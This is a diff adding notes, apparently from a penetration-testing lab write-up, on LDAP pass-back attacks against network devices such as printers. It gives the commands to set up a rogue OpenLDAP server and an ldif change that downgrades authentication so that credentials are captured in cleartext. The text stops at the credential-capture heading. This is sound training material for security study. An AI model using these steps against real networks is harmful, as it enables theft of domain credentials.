@@ -101,3 +101,16 @@ Another method of AD authentication that applications can use is Lightweight Dir
 
 ### LDAP Pass-back Attacks
 This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.  
+1. Hosting a Rogue LDAP Server  
+`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`  
+`sudo dpkg-reconfigure -p low slapd`  
+Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods.  
+we need to create a new ldif file.  
+```
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```  
+`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`  
+2. Capturing LDAP Credentials  
